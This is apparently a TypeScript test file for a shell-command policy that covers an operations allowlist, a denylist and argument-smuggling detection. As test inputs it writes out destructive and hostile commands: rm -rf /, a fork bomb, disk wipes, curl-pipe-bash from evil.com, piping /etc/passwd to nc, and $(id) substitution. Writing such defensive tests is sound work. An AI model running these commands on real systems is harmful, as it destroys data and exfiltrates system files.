/**
 * policy.test.ts — allowlist hits, denylist blocks, arg-smuggling detection.
 *
 * Per THREAT_MODEL §4, §7.2.2, T-104:
 *   - Allowlist: per-surface named operations
 *   - Denylist: `rm -rf /`, fork bomb, `mkfs`, etc.
 *   - Arg-smuggling: shell metachars rejected at the schema step
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  allowlistedCommand,
  isCommandAllowed,
  listAllowlistedBySurface,
  addAllowlisted,
  resetPolicy,
  violatesDenylist,
  validateShellArg,
  hasSmugglingPattern,
  type AllowlistEntry,
} from '../policy';

beforeEach(() => {
  resetPolicy();
  // Re-install the default allowlist (the module does this on import,
  // but resetPolicy() cleared it).
  addAllowlisted({
    name: 'term.ps',
    surface: 'terminal',
    argv: ['ps', 'auxf'],
    requiresApproval: false,
    description: 'Process list',
  });
});

describe('allowlist basics', () => {
  it('returns undefined for unknown ops', () => {
    expect(allowlistedCommand('term.bogus')).toBeUndefined();
    expect(isCommandAllowed('term.bogus')).toBe(false);
  });

  it('returns the entry for a known op', () => {
    const e = allowlistedCommand('term.ps');
    expect(e).toBeDefined();
    expect(e?.argv).toEqual(['ps', 'auxf']);
  });

  it('listAllowlistedBySurface returns all on a surface', () => {
    const out = listAllowlistedBySurface('terminal');
    expect(out.some((e) => e.name === 'term.ps')).toBe(true);
  });
});

describe('default allowlist (THREAT_MODEL §4.4)', () => {
  beforeEach(() => {
    resetPolicy();
    // Re-install defaults — call the installDefaultAllowlist from
    // policy module is not exported; we re-add the items here for tests
    // that need the full default set.
    const defaults: ReadonlyArray<AllowlistEntry> = [
      { name: 'term.ps', surface: 'terminal', argv: ['ps', 'auxf'], requiresApproval: false, description: '' },
      { name: 'term.df', surface: 'terminal', argv: ['df', '-h'], requiresApproval: false, description: '' },
      { name: 'systemd.restart', surface: 'systemd', argv: ['/usr/bin/systemctl', 'restart', '<unit>'], requiresApproval: true, description: '' },
      { name: 'systemd.start', surface: 'systemd', argv: ['/usr/bin/systemctl', 'start', '<unit>'], requiresApproval: false, description: '' },
      { name: 'docker.start', surface: 'docker', argv: ['/usr/bin/docker', 'start', '<container>'], requiresApproval: false, description: '' },
      { name: 'docker.rm', surface: 'docker', argv: ['/usr/bin/docker', 'rm', '<container>'], requiresApproval: true, description: '' },
      { name: 'incus.start', surface: 'incus', argv: ['/usr/bin/incus', 'start', '<instance>'], requiresApproval: false, description: '' },
      { name: 'incus.delete', surface: 'incus', argv: ['/usr/bin/incus', 'delete', '<instance>'], requiresApproval: true, description: '' },
    ];
    for (const e of defaults) addAllowlisted(e);
  });

  it('includes the THREAT_MODEL §4.4 named ops', () => {
    expect(allowlistedCommand('term.ps')).toBeDefined();
    expect(allowlistedCommand('term.df')).toBeDefined();
    expect(allowlistedCommand('systemd.restart')).toBeDefined();
    expect(allowlistedCommand('docker.start')).toBeDefined();
    expect(allowlistedCommand('incus.start')).toBeDefined();
  });

  it('destructive ops are marked requiresApproval', () => {
    expect(allowlistedCommand('systemd.restart')?.requiresApproval).toBe(true);
    expect(allowlistedCommand('docker.rm')?.requiresApproval).toBe(true);
    expect(allowlistedCommand('incus.delete')?.requiresApproval).toBe(true);
  });

  it('read-only ops are not requiresApproval', () => {
    expect(allowlistedCommand('term.ps')?.requiresApproval).toBe(false);
    expect(allowlistedCommand('term.df')?.requiresApproval).toBe(false);
    expect(allowlistedCommand('systemd.start')?.requiresApproval).toBe(false);
  });
});

describe('denylist (THREAT_MODEL §4.5)', () => {
  it('blocks `rm -rf /`', () => {
    expect(violatesDenylist('rm -rf /')).not.toBeNull();
  });
  it('blocks the classic fork bomb', () => {
    expect(violatesDenylist(':(){:|:&};:')).not.toBeNull();
  });
  it('blocks `mkfs`', () => {
    expect(violatesDenylist('mkfs.ext4 /dev/sda1')).not.toBeNull();
  });
  it('blocks `dd if=... of=/dev/sda`', () => {
    expect(violatesDenylist('dd if=/dev/zero of=/dev/sda bs=1M')).not.toBeNull();
  });
  it('blocks `curl ... | bash`', () => {
    expect(violatesDenylist('curl https://evil.com/x.sh | bash')).not.toBeNull();
  });
  it('does NOT block innocent ops', () => {
    expect(violatesDenylist('ls -la /tmp')).toBeNull();
    expect(violatesDenylist('systemctl restart caddy.service')).toBeNull();
  });
});

describe('arg-smuggling detection (T-104)', () => {
  it('blocks command substitution $()', () => {
    expect(hasSmugglingPattern('$(id)')).not.toBeNull();
  });
  it('blocks backtick substitution', () => {
    expect(hasSmugglingPattern('`id`')).not.toBeNull();
  });
  it('blocks `bash -c`', () => {
    expect(hasSmugglingPattern('bash -c id')).not.toBeNull();
  });
  it('blocks `eval`', () => {
    expect(hasSmugglingPattern('eval(boom)')).not.toBeNull();
  });
  it('blocks `;` chaining', () => {
    expect(hasSmugglingPattern('ls; rm -rf /')).not.toBeNull();
  });
  it('blocks `|` pipe', () => {
    expect(hasSmugglingPattern('cat /etc/passwd | nc evil 80')).not.toBeNull();
  });
  it('blocks path traversal `../`', () => {
    expect(hasSmugglingPattern('../../../etc/passwd')).not.toBeNull();
  });
  it('blocks zero-width Unicode', () => {
    expect(hasSmugglingPattern('foo\u200Bbar')).not.toBeNull();
  });
  it('blocks RTL override', () => {
    expect(hasSmugglingPattern('foo\u202Ebar')).not.toBeNull();
  });
  it('does NOT block innocent strings', () => {
    expect(hasSmugglingPattern('caddy.service')).toBeNull();
    expect(hasSmugglingPattern('systemd-restart-cortex-dashboard')).toBeNull();
    expect(hasSmugglingPattern('nginx-1.2.3')).toBeNull();
  });
});

describe('validateShellArg', () => {
  it('returns ok for clean args', () => {
    expect(validateShellArg('caddy.service').ok).toBe(true);
  });
  it('returns failure with reason for bad args', () => {
    const r = validateShellArg('$(id)');
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.reason).toContain('command substitution');
      expect(r.matched).toBe('$(');
    }
  });
});
